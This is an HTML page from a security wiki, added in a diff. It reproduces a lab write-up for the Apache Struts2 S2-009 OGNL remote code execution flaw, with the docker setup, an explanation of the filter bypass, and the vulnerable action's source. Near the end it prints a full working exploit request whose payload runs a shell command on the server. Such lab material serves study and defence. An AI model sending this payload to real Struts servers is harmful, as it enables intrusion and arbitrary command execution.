@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/struts2/s2-009/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>S2-009 Remote Code Execution Vulnerablity - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "S2-009 Remote Code Execution Vulnerablity", url: "#_top", children: [
+              {title: "Setup", url: "#setup" },
+              {title: "Reference", url: "#reference" },
+              {title: "Exploit", url: "#exploit" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        S2-009 远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../s2-008/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../s2-008/README.zh-cn/" class="btn btn-xs btn-link">
+        S2-008 远程代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="s2-009-remote-code-execution-vulnerablity">S2-009 Remote Code Execution Vulnerablity<a class="headerlink" href="#s2-009-remote-code-execution-vulnerablity" title="Permanent link">&para;</a></h1>
+<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
+<p>Affected Version: 2.1.0 - 2.3.1.1</p>
+<p>Details: <a href="http://struts.apache.org/docs/s2-009.html">http://struts.apache.org/docs/s2-009.html</a></p>
+<h2 id="setup">Setup<a class="headerlink" href="#setup" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>docker compose build
+docker compose up -d
+</code></pre></div>
+<h2 id="reference">Reference<a class="headerlink" href="#reference" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>This vulnerability is derived from s2-003, s2-005. If you want to understand the principle of the vulnerability, you need to read the instructions of s2-005: <a href="https://github.com/phith0n/vulhub/blob/master/struts2/s2-005/README.md">https://github.com/phith0n/vulhub/blob/master/struts2/s2-005/README.md</a></p>
+</blockquote>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=21197">Struts2 vulnerability analysis</a>, as mentioned in the article, the method of introducing OGNL may not only appear in this vulnerability, but may also appear in other Java applications.</p>
+<p>Struts2's repair method for s2-003 is to prohibit static method calls. In s2-005, this restriction can be bypassed directly through OGNL. For the <code>#</code> number, use the code <code>\u0023</code> or <code>\43</code> to bypass; then s2-005's repair is forbidden  and others special symbols that prevent users submit backslashes.</p>
+<p>However, if a parameter <code>example</code> is accepted in the current action, this parameter will be sent to the OGNL expression. So, we can put the OGNL expression code in the <code>example</code> parameter and then execute it by <code>/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)('xxx')=1</code>, then bypass defense of special characters such as <code>#</code>, <code>\</code>.</p>
+<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
+<p>The environment is a struts2 "feature display" website named <code>Struts Showcase</code>. We need find an action that accepts the parameter, and type is string.</p>
+<p>First decompress <code>S2-009.war</code>. We can see that source code is in the <code>WEB-INF/src</code> directory, I generally look for ajax related code.</p>
+<p>Found one in<code>WEB-INF/src/java/org/apache/struts2/showcase/ajax/Example5Action.java</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Example5Action</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">ActionSupport</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">serialVersionUID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2111967621952300611L</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="n">age</span><span class="p">;</span>
+
+
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setName</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="nf">getAge</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setAge</span><span class="p">(</span><span class="n">Integer</span><span class="w"> </span><span class="n">age</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nd">@Override</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">execute</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">SUCCESS</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>The code is simple, it accepts the name parameter and calls setName to assign it to the private property <code>this.name</code>, which is in line with our requirement. Then we go to <code>WEB-INF/src/java/struts-ajax.xml</code> to see the URL routing setting:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;package</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;ajax&quot;</span><span class="w"> </span><span class="na">extends=</span><span class="s">&quot;struts-default&quot;</span><span class="nt">&gt;</span>
+<span class="w">    </span>...
+<span class="w">    </span><span class="nt">&lt;action</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;example5&quot;</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;org.apache.struts2.showcase.ajax.Example5Action&quot;</span><span class="nt">&gt;</span>
+<span class="w">        </span><span class="nt">&lt;result</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;input&quot;</span><span class="nt">&gt;</span>/ajax/tabbedpanel/example5.jsp<span class="nt">&lt;/result&gt;</span>
+<span class="w">        </span><span class="nt">&lt;result&gt;</span>/ajax/tabbedpanel/example5Ok.jsp<span class="nt">&lt;/result&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/action&gt;</span>
+<span class="w">    </span>...
+<span class="nt">&lt;/package&gt;</span>
+</code></pre></div>
+<p>We can see <code>name=example5</code>, so access the controller by visiting <code>http://your-ip:8080/ajax/example5.action</code>. Then put the OGNL exploit code in the name parameter and access the URL:</p>
+<div class="highlight"><pre><span></span><code>GET /ajax/example5?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true HTTP/1.1
+Host: localhost:8080
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+</code></pre></div>
+<p>The POC don't have display, so we use <code>touch /tmp/success</code> command, and we found that the <code>success</code> file has been created to prove that expliot succeeded.</p>
+<p><img alt="" src="1.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        S2-009 远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../s2-008/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../s2-008/README.zh-cn/" class="btn btn-xs btn-link">
+        S2-008 远程代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
